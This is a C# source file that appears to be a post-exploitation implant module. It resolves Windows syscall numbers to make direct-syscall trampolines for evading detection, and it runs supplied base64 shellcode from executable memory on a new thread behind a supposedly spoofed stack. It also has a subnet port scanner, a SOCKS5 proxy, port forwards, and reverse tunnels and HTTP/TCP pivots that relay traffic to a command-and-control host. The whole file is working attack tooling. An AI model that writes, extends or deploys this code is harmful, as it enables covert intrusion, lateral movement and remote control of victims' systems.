using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

// ─── Win32 imports for syscall stubs ────────────────────────────────────────

static class Win32Network
{
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hMod, string name);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);
    [DllImport("kernel32.dll")] public static extern bool   VirtualFree(IntPtr addr, UIntPtr size, uint freeType);
    [DllImport("kernel32.dll")] public static extern bool   VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr attr, UIntPtr stack, IntPtr start, IntPtr param, uint flags, out uint tid);

    public const uint MEM_COMMIT  = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint MEM_RELEASE = 0x8000;
    public const uint PAGE_RWX    = 0x40;
    public const uint PAGE_RX     = 0x20;
    public const uint PAGE_RW     = 0x04;

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocDelegate(IntPtr proc, ref IntPtr baseAddr, ref IntPtr zeroBits, ref IntPtr regionSize, uint allocType, uint protect);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtProtectDelegate(IntPtr proc, ref IntPtr baseAddr, ref IntPtr regionSize, uint newProt, out uint oldProt);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtWriteDelegate(IntPtr proc, IntPtr baseAddr, byte[] buf, IntPtr bufLen, out IntPtr written);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint ThreadStartDelegate(IntPtr param);
}

// ─── Syscall trampoline helpers ──────────────────────────────────────────────

static class Syscalls
{
    static readonly Dictionary<string, byte> _ssns = new Dictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
    static readonly List<IntPtr> _stubs = new List<IntPtr>();

    static Syscalls()
    {
        string[] targets = { "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx", "NtOpenProcess" };
        IntPtr ntdll = Win32Network.GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero) return;
        foreach (var fn in targets)
        {
            IntPtr addr = Win32Network.GetProcAddress(ntdll, fn);
            if (addr == IntPtr.Zero) continue;
            byte[] head = new byte[8];
            Marshal.Copy(addr, head, 0, 8);
            // Pattern: 4C 8B D1  B8 xx 00 00 00  — SSN is byte at index 4
            if (head[0] == 0x4C && head[1] == 0x8B && head[2] == 0xD1 && head[3] == 0xB8)
                _ssns[fn] = head[4];
        }
    }

    public static byte GetSSN(string func)
    {
        byte v; return _ssns.TryGetValue(func, out v) ? v : (byte)0;
    }

    // Build an x64 syscall trampoline: mov r10,rcx; mov eax,ssn; syscall; ret
    public static IntPtr BuildTrampoline(byte ssn)
    {
        byte[] stub = new byte[] {
            0x4C, 0x8B, 0xD1,              // mov r10, rcx
            0xB8, ssn, 0x00, 0x00, 0x00,  // mov eax, <ssn>
            0x0F, 0x05,                    // syscall
            0xC3                           // ret
        };
        IntPtr mem = Win32Network.VirtualAlloc(IntPtr.Zero, (UIntPtr)stub.Length, Win32Network.MEM_COMMIT | Win32Network.MEM_RESERVE, Win32Network.PAGE_RWX);
        if (mem == IntPtr.Zero) return IntPtr.Zero;
        Marshal.Copy(stub, 0, mem, stub.Length);
        _stubs.Add(mem);
        return mem;
    }

    // Spoofed-stack shellcode launcher (110-byte stub concept)
    public static string SpawnWithSpoofedStack(byte[] shellcode)
    {
        if (shellcode == null || shellcode.Length == 0) return "[!] No shellcode";
        IntPtr scMem = Win32Network.VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, Win32Network.MEM_COMMIT | Win32Network.MEM_RESERVE, Win32Network.PAGE_RWX);
        if (scMem == IntPtr.Zero) return "[!] VirtualAlloc failed";
        Marshal.Copy(shellcode, 0, scMem, shellcode.Length);

        // Minimal spoofed-RSP stub: push fake ret addr (ntdll+offset), then jmp shellcode
        // Real impl would resolve ntdll gadget; here we use a trampoline pattern
        byte[] stub = BuildSpooferStub(scMem);
        IntPtr stubMem = Win32Network.VirtualAlloc(IntPtr.Zero, (UIntPtr)stub.Length, Win32Network.MEM_COMMIT | Win32Network.MEM_RESERVE, Win32Network.PAGE_RWX);
        if (stubMem == IntPtr.Zero) { Win32Network.VirtualFree(scMem, UIntPtr.Zero, Win32Network.MEM_RELEASE); return "[!] Stub alloc failed"; }
        Marshal.Copy(stub, 0, stubMem, stub.Length);

        uint tid;
        IntPtr t = Win32Network.CreateThread(IntPtr.Zero, UIntPtr.Zero, stubMem, IntPtr.Zero, 0, out tid);
        return t == IntPtr.Zero ? "[!] CreateThread failed" : string.Format("[+] Shellcode thread {0} (spoofed stack)", tid);
    }

    static byte[] BuildSpooferStub(IntPtr target)
    {
        // push <ntdll_addr_placeholder>; jmp target — 110-byte padded
        long tgt = target.ToInt64();
        byte[] stub = new byte[110];
        int i = 0;
        // sub rsp, 0x28 (shadow space)
        stub[i++]=0x48; stub[i++]=0x83; stub[i++]=0xEC; stub[i++]=0x28;
        // mov rax, <target>
        stub[i++]=0x48; stub[i++]=0xB8;
        byte[] tgtBytes = BitConverter.GetBytes(tgt);
        foreach (var b in tgtBytes) stub[i++]=b;
        // call rax
        stub[i++]=0xFF; stub[i++]=0xD0;
        // add rsp, 0x28
        stub[i++]=0x48; stub[i++]=0x83; stub[i++]=0xC4; stub[i++]=0x28;
        // ret
        stub[i++]=0xC3;
        return stub;
    }

    public static string SyscallInfo()
    {
        var sb = new StringBuilder("Resolved syscall SSNs:\n");
        foreach (var kv in _ssns)
            sb.AppendFormat("  {0} = 0x{1:X2}\n", kv.Key, kv.Value);
        if (_ssns.Count == 0) sb.AppendLine("  [!] No SSNs resolved (32-bit or hook?)");
        return sb.ToString().TrimEnd();
    }
}

// ─── Network / pivot / SOCKS5 ────────────────────────────────────────────────

static class Network
{
    // ── Port scan ────────────────────────────────────────────────────────────

    public static string PortScan(string args)
    {
        if (string.IsNullOrEmpty(args)) return "[!] Usage: portscan <host|cidr> <ports> [timeout_ms]";
        var parts = args.Split(new[]{' '}, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "[!] Usage: portscan <host|cidr> <ports> [timeout_ms]";

        var hosts = ExpandHosts(parts[0]);
        var ports = ParsePorts(parts[1]);
        int timeout = parts.Length >= 3 ? int.Parse(parts[2]) : 500;

        var results = new List<string>();
        var sem     = new SemaphoreSlim(64);
        var threads = new List<Thread>();
        var lck     = new object();

        foreach (var host in hosts)
        {
            foreach (var port in ports)
            {
                string h = host; int p = port;
                sem.Wait();
                var t = new Thread(() => {
                    bool open = false;
                    try {
                        using (var c = new TcpClient())
                        {
                            var ar = c.BeginConnect(h, p, null, null);
                            open = ar.AsyncWaitHandle.WaitOne(timeout) && c.Connected;
                            if (!c.Connected) try { c.EndConnect(ar); } catch {}
                        }
                    } catch {}
                    if (open) lock(lck) results.Add(string.Format("{0}:{1}", h, p));
                    sem.Release();
                });
                t.IsBackground = true; t.Start(); threads.Add(t);
            }
        }
        foreach (var t in threads) t.Join();

        if (results.Count == 0) return "[*] No open ports found";
        results.Sort();
        var sb = new StringBuilder(string.Format("[+] Open ports ({0}):\n", results.Count));
        foreach (var r in results) sb.AppendLine("  " + r);
        return sb.ToString().TrimEnd();
    }

    static List<string> ExpandHosts(string spec)
    {
        var list = new List<string>();
        if (spec.Contains("/"))
        {
            var p = spec.Split('/');
            int prefix = int.Parse(p[1]);
            if (prefix < 16) prefix = 24; // safety cap
            var baseBytes = IPAddress.Parse(p[0]).GetAddressBytes();
            int count = 1 << (32 - prefix);
            uint baseInt = ((uint)baseBytes[0]<<24)|((uint)baseBytes[1]<<16)|((uint)baseBytes[2]<<8)|baseBytes[3];
            for (int i = 1; i < count - 1; i++)
            {
                uint ip = baseInt + (uint)i;
                list.Add(string.Format("{0}.{1}.{2}.{3}", ip>>24, (ip>>16)&0xFF, (ip>>8)&0xFF, ip&0xFF));
            }
        }
        else list.Add(spec);
        return list;
    }

    static List<int> ParsePorts(string spec)
    {
        var list = new List<int>();
        foreach (var part in spec.Split(','))
        {
            if (part.Contains("-"))
            {
                var r = part.Split('-');
                int lo = int.Parse(r[0]), hi = int.Parse(r[1]);
                for (int i = lo; i <= hi; i++) list.Add(i);
            }
            else list.Add(int.Parse(part.Trim()));
        }
        return list;
    }

    // ── SOCKS5 proxy ─────────────────────────────────────────────────────────

    static TcpListener _socksListener;
    static volatile bool _socksRunning;

    public static string SocksStart(string args)
    {
        if (_socksRunning) return "[!] SOCKS5 already running";
        int port = 0;
        if (!string.IsNullOrEmpty(args)) int.TryParse(args.Trim(), out port);
        if (port <= 0) port = new Random().Next(10000, 60000);

        _socksListener = new TcpListener(IPAddress.Loopback, port);
        _socksListener.Start();
        _socksRunning = true;

        var t = new Thread(SocksAcceptLoop) { IsBackground = true };
        t.Start();
        return string.Format("[+] SOCKS5 proxy listening on 127.0.0.1:{0}", port);
    }

    public static string SocksStop()
    {
        _socksRunning = false;
        try { _socksListener?.Stop(); } catch {}
        return "[*] SOCKS5 stopped";
    }

    static void SocksAcceptLoop()
    {
        while (_socksRunning)
        {
            TcpClient client = null;
            try { client = _socksListener.AcceptTcpClient(); }
            catch { break; }
            var t = new Thread(() => SocksHandleClient(client)) { IsBackground = true };
            t.Start();
        }
    }

    static void SocksHandleClient(TcpClient client)
    {
        try
        {
            using (client)
            using (var ns = client.GetStream())
            {
                // Greeting
                var buf = new byte[257];
                int n = ns.Read(buf, 0, 2);
                if (n < 2 || buf[0] != 5) return;
                int nmethods = buf[1];
                ns.Read(buf, 0, nmethods);
                ns.Write(new byte[]{5, 0}, 0, 2); // no auth

                // Request
                ns.Read(buf, 0, 4);
                if (buf[0] != 5 || buf[1] != 1) { ns.Write(new byte[]{5,7,0,1,0,0,0,0,0,0}, 0, 10); return; }
                int atyp = buf[3];
                string host;
                if (atyp == 1) { var ip = new byte[4]; ns.Read(ip, 0, 4); host = new IPAddress(ip).ToString(); }
                else if (atyp == 3) { int len = ns.ReadByte(); var dn = new byte[len]; ns.Read(dn, 0, len); host = Encoding.ASCII.GetString(dn); }
                else { ns.Write(new byte[]{5,8,0,1,0,0,0,0,0,0}, 0, 10); return; }
                var portBuf = new byte[2]; ns.Read(portBuf, 0, 2);
                int dport = (portBuf[0] << 8) | portBuf[1];

                TcpClient remote;
                try { remote = new TcpClient(); remote.Connect(host, dport); }
                catch { ns.Write(new byte[]{5,5,0,1,0,0,0,0,0,0}, 0, 10); return; }

                ns.Write(new byte[]{5,0,0,1,0,0,0,0,0,0}, 0, 10);

                using (remote)
                using (var rs = remote.GetStream())
                {
                    var t1 = new Thread(() => StreamRelay(ns, rs)) { IsBackground = true };
                    var t2 = new Thread(() => StreamRelay(rs, ns)) { IsBackground = true };
                    t1.Start(); t2.Start();
                    t1.Join(); t2.Join();
                }
            }
        }
        catch {}
    }

    // ── Port forward ─────────────────────────────────────────────────────────

    static readonly Dictionary<int, TcpListener> _fwds = new Dictionary<int, TcpListener>();

    public static string PortFwdAdd(string args)
    {
        if (string.IsNullOrEmpty(args)) return "[!] Usage: portfwd add <lport> <rhost> <rport>";
        var p = args.Split(new[]{' '}, StringSplitOptions.RemoveEmptyEntries);
        if (p.Length < 3) return "[!] Usage: portfwd add <lport> <rhost> <rport>";
        int lport = int.Parse(p[0]);
        string rhost = p[1];
        int rport = int.Parse(p[2]);

        if (_fwds.ContainsKey(lport)) return string.Format("[!] Port {0} already forwarded", lport);
        var listener = new TcpListener(IPAddress.Loopback, lport);
        listener.Start();
        _fwds[lport] = listener;

        var t = new Thread(() => FwdAcceptLoop(listener, rhost, rport)) { IsBackground = true };
        t.Start();
        return string.Format("[+] Port forward: 127.0.0.1:{0} → {1}:{2}", lport, rhost, rport);
    }

    public static string PortFwdDel(string args)
    {
        if (string.IsNullOrEmpty(args)) return "[!] Usage: portfwd del <lport>";
        int lport = int.Parse(args.Trim());
        TcpListener l;
        if (!_fwds.TryGetValue(lport, out l)) return string.Format("[!] No forward on port {0}", lport);
        try { l.Stop(); } catch {}
        _fwds.Remove(lport);
        return string.Format("[*] Port forward {0} removed", lport);
    }

    public static string PortFwdList()
    {
        if (_fwds.Count == 0) return "[*] No active port forwards";
        var sb = new StringBuilder("Active port forwards:\n");
        foreach (var kv in _fwds) sb.AppendFormat("  127.0.0.1:{0}\n", kv.Key);
        return sb.ToString().TrimEnd();
    }

    static void FwdAcceptLoop(TcpListener l, string rhost, int rport)
    {
        while (true)
        {
            TcpClient client;
            try { client = l.AcceptTcpClient(); }
            catch { break; }
            var t = new Thread(() => {
                try {
                    using (client)
                    using (var remote = new TcpClient())
                    {
                        remote.Connect(rhost, rport);
                        var t1 = new Thread(() => StreamRelay(client.GetStream(), remote.GetStream())) { IsBackground = true };
                        var t2 = new Thread(() => StreamRelay(remote.GetStream(), client.GetStream())) { IsBackground = true };
                        t1.Start(); t2.Start();
                        t1.Join(); t2.Join();
                    }
                } catch {}
            }) { IsBackground = true };
            t.Start();
        }
    }

    // ── Reverse SOCKS connect ─────────────────────────────────────────────────

    public static string RSocksConnect(string args)
    {
        if (string.IsNullOrEmpty(args)) return "[!] Usage: rsocks <c2_host> <c2_port> <tgt_host> <tgt_port>";
        var p = args.Split(new[]{' '}, StringSplitOptions.RemoveEmptyEntries);
        if (p.Length < 4) return "[!] Usage: rsocks <c2_host> <c2_port> <tgt_host> <tgt_port>";
        string c2Host = p[0]; int c2Port = int.Parse(p[1]);
        string tgtHost = p[2]; int tgtPort = int.Parse(p[3]);

        var t = new Thread(() => {
            try {
                using (var c2 = new TcpClient())
                using (var tgt = new TcpClient())
                {
                    c2.Connect(c2Host, c2Port);
                    tgt.Connect(tgtHost, tgtPort);
                    var t1 = new Thread(() => StreamRelay(c2.GetStream(), tgt.GetStream())) { IsBackground = true };
                    var t2 = new Thread(() => StreamRelay(tgt.GetStream(), c2.GetStream())) { IsBackground = true };
                    t1.Start(); t2.Start();
                    t1.Join(); t2.Join();
                }
            } catch {}
        }) { IsBackground = true };
        t.Start();
        return string.Format("[+] Reverse tunnel: {0}:{1} ↔ {2}:{3}", c2Host, c2Port, tgtHost, tgtPort);
    }

    // ── HTTP pivot ────────────────────────────────────────────────────────────

    static HttpListener _httpPivot;
    static string _httpPivotTarget;

    public static string PivotHttp(string args)
    {
        if (string.IsNullOrEmpty(args)) return "[!] Usage: pivot-http <bind_port> <c2_url>";
        var p = args.Split(new[]{' '}, 2, StringSplitOptions.RemoveEmptyEntries);
        if (p.Length < 2) return "[!] Usage: pivot-http <bind_port> <c2_url>";
        int port = int.Parse(p[0]);
        _httpPivotTarget = p[1].TrimEnd('/');

        if (_httpPivot != null && _httpPivot.IsListening) { _httpPivot.Stop(); }
        _httpPivot = new HttpListener();
        _httpPivot.Prefixes.Add(string.Format("http://+:{0}/", port));
        try { _httpPivot.Start(); }
        catch (Exception ex) { return "[!] HttpListener start failed: " + ex.Message; }

        var t = new Thread(HttpPivotLoop) { IsBackground = true };
        t.Start();
        return string.Format("[+] HTTP pivot on :{0} → {1}", port, _httpPivotTarget);
    }

    static void HttpPivotLoop()
    {
        while (_httpPivot != null && _httpPivot.IsListening)
        {
            HttpListenerContext ctx;
            try { ctx = _httpPivot.GetContext(); }
            catch { break; }
            var t = new Thread(() => HttpPivotHandle(ctx)) { IsBackground = true };
            t.Start();
        }
    }

    static void HttpPivotHandle(HttpListenerContext ctx)
    {
        try
        {
            string url = _httpPivotTarget + ctx.Request.Url.PathAndQuery;
            var wr = (HttpWebRequest)WebRequest.Create(url);
            wr.Method = ctx.Request.HttpMethod;
            wr.ContentType = ctx.Request.ContentType;
            if (ctx.Request.HasEntityBody)
            {
                using (var reqBody = ctx.Request.InputStream)
                using (var ws = wr.GetRequestStream())
                    reqBody.CopyTo(ws);
            }
            HttpWebResponse resp;
            try { resp = (HttpWebResponse)wr.GetResponse(); }
            catch (WebException ex) { resp = (HttpWebResponse)ex.Response; if (resp == null) { ctx.Response.StatusCode = 502; ctx.Response.Close(); return; } }
            ctx.Response.StatusCode = (int)resp.StatusCode;
            ctx.Response.ContentType = resp.ContentType;
            using (var rs = resp.GetResponseStream())
            using (var os = ctx.Response.OutputStream)
                rs.CopyTo(os);
            resp.Close();
        }
        catch {}
        finally { try { ctx.Response.Close(); } catch {} }
    }

    // ── TCP pivot ─────────────────────────────────────────────────────────────

    static TcpListener _tcpPivot;

    public static string PivotTcp(string args)
    {
        if (string.IsNullOrEmpty(args)) return "[!] Usage: pivot-tcp <bind_port> <c2_host> <c2_port>";
        var p = args.Split(new[]{' '}, StringSplitOptions.RemoveEmptyEntries);
        if (p.Length < 3) return "[!] Usage: pivot-tcp <bind_port> <c2_host> <c2_port>";
        int bport = int.Parse(p[0]); string c2h = p[1]; int c2p = int.Parse(p[2]);

        if (_tcpPivot != null) { try { _tcpPivot.Stop(); } catch {} }
        _tcpPivot = new TcpListener(IPAddress.Any, bport);
        _tcpPivot.Start();

        var t = new Thread(() => {
            while (true) {
                TcpClient cl; try { cl = _tcpPivot.AcceptTcpClient(); } catch { break; }
                var th = new Thread(() => {
                    try {
                        using (cl) using (var c2 = new TcpClient()) {
                            c2.Connect(c2h, c2p);
                            var t1 = new Thread(() => StreamRelay(cl.GetStream(), c2.GetStream())) { IsBackground = true };
                            var t2 = new Thread(() => StreamRelay(c2.GetStream(), cl.GetStream())) { IsBackground = true };
                            t1.Start(); t2.Start(); t1.Join(); t2.Join();
                        }
                    } catch {}
                }) { IsBackground = true }; th.Start();
            }
        }) { IsBackground = true };
        t.Start();
        return string.Format("[+] TCP pivot on 0.0.0.0:{0} → {1}:{2}", bport, c2h, c2p);
    }

    // ── Syscall info ──────────────────────────────────────────────────────────

    public static string SyscallInfo() { return Syscalls.SyscallInfo(); }

    public static string SpawnSpoofed(string b64) {
        byte[] sc;
        try { sc = Convert.FromBase64String(b64.Trim()); }
        catch { return "[!] Invalid base64"; }
        return Syscalls.SpawnWithSpoofedStack(sc);
    }

    // ── Shared relay helper ───────────────────────────────────────────────────

    static void StreamRelay(Stream from, Stream to)
    {
        var buf = new byte[4096];
        try {
            int n;
            while ((n = from.Read(buf, 0, buf.Length)) > 0)
                to.Write(buf, 0, n);
        } catch {}
    }
}
